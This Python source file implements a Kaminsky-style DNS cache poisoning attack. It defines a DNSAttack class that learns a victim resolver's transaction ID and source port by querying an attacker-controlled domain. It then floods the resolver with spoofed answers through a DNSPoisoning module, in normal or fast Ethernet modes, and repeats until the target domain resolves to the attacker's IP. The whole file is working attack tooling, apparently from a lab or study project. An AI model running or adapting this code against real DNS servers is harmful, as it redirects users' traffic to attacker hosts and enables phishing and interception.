#! /usr/bin/env python3
   
## @package DNS_Attack
#   This package is responsible to execute all the passage required for the attack
#

import dns.resolver
from dns.resolver import NoAnswer
import socket
import signal
from multiprocessing.pool import ThreadPool, Pool

import re
from enum import Enum


from dns_poisoning import DNSPoisoning

##  @class DNSAttack
#
#   @brief Class to handle DNSPoisonig procedures
#
#   This class provide an interface to perform the Kaminsky DNS poisoning attack.\n
#   Apart from providing an interface to the DNSPoisoning module, it has function that allows to fetch the TXID and the port used by the target server.
#
class DNSAttack:

    ##
    #   Used to specified the attack mode
    class Mode(Enum):
        ## Uses IP layer packets
        NORMAL = 1
        ## Uses Ethernet layer frames
        FAST = 2
    

    ## Constructors
    #
    #   @param victim_server_ip
    #   @param attacked_domain 
    #   @param bad_server_data (ip, port) The UDP server IP and port
    #   @param attacker_ip
    #   @param victim_mac   The victim server MAC address (Only required for faster flooding)
    #   @param ns_server_ip The authoritative NS server for the target domain
    #   @param attack_type  Specify the attack to perform @ref DNSPoisoning.AttackType
    #   @param nic_interface    Set the network iterface to use on faster flooding
    #
    #   @param sigint_handler    The functin to call when SIGINT signal is received
    #   @param log_function      The function to call when message need to be printed
    #
    #   @todo Check if port and IP are valid

    def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
         attacker_ip, bad_domain, ns_server_ip=None, victim_mac=None, nic_interface=None,\
            sigint_handler=None, log_function=lambda msg: None):

        # Victim IP address
        self.victim_server_ip = victim_server_ip
        ## Attacker IP address
        self.attacker_ip = attacker_ip
        ## Domain to spoof
        self.domain = attacked_domain
        ## Light DNS IP
        self.bad_udp_ip = bad_server_data[0]
        ## Light DNS port
        self.bad_udp_port = bad_server_data[1]
        ## Domain owned by the attacker, used to fetch TXID and source port
        self.bad_domain = bad_domain

        #Only required for faster flooding
        ## Victim MAC address (only for faster flooding)
        self.victim_mac = victim_mac
        ## Network Card Interface to use (only for faster flooding)
        self.nic_interface = nic_interface



        #Enchant parameters
        ## SIGINT (Ctrl+C) handler to use 
        self.sigint_handler = sigint_handler
        ## Logging function to use
        self.log = log_function

        #Internal Variable
        ## Stop running procedures
        self.stop_flag = False

        # Check Parameter
        #-----------------------------------------
        if ns_server_ip is None:
            self.ns_server_ip = self.get_authoritative_server(self.domain, self.victim_server_ip)
        else:
            self.ns_server_ip = ns_server_ip


    #Exceptions

    ##  
    #   @brief Raised when a critical error occurred
    #
    class CriticalError(Exception):
        pass

    ##  
    #   @brief Exception raised when the initial query fails
    #
    #   Raised when initial query performed to get a TXID fails    
    class InitialQueryFailed(CriticalError):
        pass

    ##  
    #   @brief Exception raised when the passed attack type is not valid
    #
    #   Raised when the passed attack type is not valid  
    class InvalidAttackType(CriticalError):
        pass

    ##  
    #   @brief Exception raised when invalid IP address is passed
    #
    #   Raised when the passed IP address is invalid
    #   @todo To implement
    class InvalidIPAddress(CriticalError):
        pass

    ##  
    #   @brief Exception raised when NS server IP cannot be fetched
    #
    #   Raised when NS server IP cannot be fetched
    class NSFetchError(CriticalError):
        pass

    ##  
    #   @brief Raised when the attack succeded
    #
    class SuccessfulAttack(Exception):
        pass

    ##
    #   @brief Handler used to stop the attack
    #   
    #   Called to stop the current attack routine
    #
    def stop_attack(self, sig, frame):
        self.stop_flag = True
        #Attach SIGINT signal to the Main stop handler
        signal.signal(signal.SIGINT, self.sigint_handler)

    ##  Start UDP Server
    #   @brief Start an UDP server and return the fetched TXID and the source port
    #   @return (int) The fetched TXID
    #   @return (int) The source port where the query comes from
    #
    def get_server_data(self):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        sock.bind((self.bad_udp_ip, self.bad_udp_port))

        self.log("Listening for incoming DNS request...")

        while True:
            #Returns (query, [ip-address, source_port])
            data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
            self.log("Response source port :{t.bold}{t.blue}" + str(addr[1]) + "{t.normal}", 2)
            
            #The ID are placed in the first 16-bit
            received_id = data[0:2] #Consider only the first 16 bit
            initial_id = int.from_bytes(received_id, byteorder='big')  #Convert to int
            self.log("ID: " + str(initial_id), 3)

            sock.close()
            # addr[1] is the source_port where the query comes from
            return (initial_id, addr[1])

    ##
    #   @brief Start the process to send the initial query
    #   
    def send_initial_query(self):

        victim_server = dns.resolver.Resolver()
        victim_server.nameservers = [self.victim_server_ip]

        try:
            answer = victim_server.query(self.bad_domain, "A")
            for rdata in answer:
                    self.log("Query response received", 2)
        except:
            self.log("{t.red}{t.bold}Query failed{t.normal}")
            raise self.InitialQueryFailed

    ## 
    #   @brief Get IP of the NS server 
    #   @param (str) domain           The domain used to fetch NS server
    #   @param (IP) dns_server_ip    The server where request should be sent
    #
    #   @return (IP) the NS server IP
    #
    #   @exceptions Raises DNSAttack.NSFetchError in case of fetching error
    #
    def get_authoritative_server(self, domain, dns_server_ip):

        dns_server = dns.resolver.Resolver()
        dns_server.nameservers = [dns_server_ip]

        response = dns_server.query(domain, 'NS')

        if response.rrset is not None:
            ns_server_string = str(response.rrset)
            ns_server = re.findall("(?<=NS).*", ns_server_string)   #Get all char after 'NS'
            ns_server = ns_server[0].lstrip()    #Only use first match
            self.log("NS server(s): " + str(ns_server))

            response = dns_server.query(ns_server, 'A')
            if response.rrset is not None:
                response_string = str(response.rrset)
                ip_addr = re.findall("(?<=A).*", response_string)   #Get all char after 'A'
                ip_addr = ip_addr[0].lstrip()
                return ip_addr
        #If somethig went wrong
        raise self.NSFetchError

    ##
    #   @brief Check if the poisonig succeded
    #   @param dns_server_ip    The server to check
    #   @param spoofed_ip       The IP address that should be spoofed
    #   @return True in case of success, False otherwire
    #
    #   Ask an "A" query to the victim server and check if the returned IP is the one inteded to spoof.\n
    #   If no arguement is supplied, parameter are taken from the class attributes.

    def check_poisoning(self, dns_server_ip=None, spoofed_ip=None):

        if dns_server_ip is None:
            dns_server_ip = self.victim_server_ip
        if spoofed_ip is None:
            spoofed_ip = self.attacker_ip

        dns_server = dns.resolver.Resolver()
        dns_server.nameservers = [dns_server_ip]

        response = dns_server.query(self.domain, 'A')
        if response.rrset is not None:
            response_string = str(response.rrset)
            ip_addr = re.findall("(?<=A).*", response_string)   #Get all char after 'A'
            ip_addr = ip_addr[0].lstrip()

            if ip_addr == spoofed_ip:
                return True

        return False       


    def check_recursion(self, dns_server_ip=None, domain=None):
        import time

        if dns_server_ip is None:
            dns_server_ip = self.victim_server_ip

        if domain is None:
            domain = self.domain

        dns_server = dns.resolver.Resolver()
        dns_server.nameservers = [dns_server_ip]

        try:
            response = dns_server.query(domain, 'A')
        except dns.resolver.NoAnswer:
            print("DNS response error")
            return False
        except dns.resolver.NXDOMAIN:
            self.log("(Checking Recursion) - No response found", 4)

        time.sleep(2)

        if response is None:
            print("No response")

        if response.RA is None:
            print("Recursion not available")
        else:
            print("Recursion Available")        



    ##  
    #   @brief Start the attack
    #   @param number_of_tries (int) The number of tentative (Default 50)
    #   @param mode (DNSAttack.Mode) The type of attack to be performed, see the above link
    #   @see DNSAttack::Mode
    #
    #   @exceptions Raise DNSAttack::SuccessfulAttack in case of successful attack.\n
    #   @exceptions Raise DNSAttack::CriticalError in case of error.\n
    #   @exceptions Raise DNSAttack::InvalidAttackType in case an invalid attack type is provided.\n
    def start(self, number_of_tries=50, mode=Mode.NORMAL, attack_type="NORMAL"):

        succeded = False
        num = number_of_tries

        self.log("Executing " + str(number_of_tries) + " attacks...")


        flood_socket = None

        # Check the attack mode
        # ---------------------------------------
        if mode == "NORMAL":
            self.log("Using Normal Mode")
            mode = self.Mode.NORMAL
        elif mode == "FAST":
            self.log("Using Faster Mode")
            self.log("Opening socket...")
            mode = self.Mode.FAST
            flood_socket = DNSPoisoning.create_socket(self, self.nic_interface)
        #----------------------------------------

        # Set the attack type attribute if was not previously set
        
        if attack_type == "NORMAL":
            self.attack_type = DNSPoisoning.AttackType.NORMAL
        elif attack_type == "DAN":
            self.attack_type = DNSPoisoning.AttackType.DAN
        else:
            raise self.InvalidAttackType
        



        # Attack Loop
        while num and not succeded and not self.stop_flag:

            self.log("\n ------ {t.bold}{t.shadow}Attack Number " + str(number_of_tries - num) + "{t.normal} ------\n")

            ## Data Fetching code
            #---------------------------------------------------------------------
            self.log("Starting DNS light server")

            #Start the DNS listening server
            pool = ThreadPool(processes=1)
            async_data_result = pool.apply_async(self.get_server_data)

            self.log("\n\nStart sending the first request to \"{t.italic}" + str(self.bad_domain) + "{t.normal}\"")
            try:
                self.send_initial_query()   # Send the query related to attacker control zone
            except self.InitialQueryFailed:
                self.log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}")
                pool.terminate()    # Terminate the UDP server
                raise self.CriticalError

            fetched_id, source_port = async_data_result.get()  # get the return value from your function.

            self.log("Fetched ID: {t.green}{t.bold}" + str(fetched_id) + "{t.normal}")
            self.log("Source port: {t.blue}{t.bold}" + str(source_port) + "{t.normal}")
            #---------------------------------------------------------------------



            # Create the Poisoning Object
            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, self.ns_server_ip, fetched_id, sport = source_port,\
                victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)

            # Set the attack type
            #--------------------------------------------------------
            if self.attack_type == DNSPoisoning.AttackType.NORMAL:
                self.log("Ok, let's try to perform \"{t.italic}Classical's Shenanigans{t.normal}\" attack")
                poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)
            elif self.attack_type == DNSPoisoning.AttackType.DAN:
                self.log("Ok, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\" attack")
                poison.set_attack_type(DNSPoisoning.AttackType.DAN)
            else:
                self.log("Invalid attack type selected")
                raise self.InvalidAttackType
            #--------------------------------------------------------


            #Attach SIGINT signal to the DNSPoisoning stop handler
            signal.signal(signal.SIGINT, poison.stop_handler)

            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...", 3)
            ## Start the specified Attack 
            #--------------------------------------------------------
            if mode == self.Mode.NORMAL:
                # Normal Flooding
                try:
                    poison.start_flooding()
                except:
                    self.log("{t.underline}Unknow Error has occurred{t.normal}")
                    raise self.CriticalError

            elif mode == self.Mode.FAST:
                # Fast Flooding
                try:
                    poison.set_interface(self.nic_interface)
                    poison.set_victim_mac(self.victim_mac)
                    poison.faster_flooding()    #Using the faster version

                except DNSPoisoning.InvalidMAC:
                    self.log("{t.red}Invalid MAC address provided{t.normal}")
                    raise self.CriticalError
                except:
                    self.log("{t.underline}Unknow Error has occurred{t.normal}")
                    raise self.CriticalError
            #--------------------------------------------------------

        
            self.log("Checking the attack results", 2)
            if self.check_poisoning():
                self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
                succeded = True
                raise self.SuccessfulAttack
            else:
                self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
                num = num - 1
        
        self.log("Attack {t.red}{t.bold}STOPPED{t.normal}")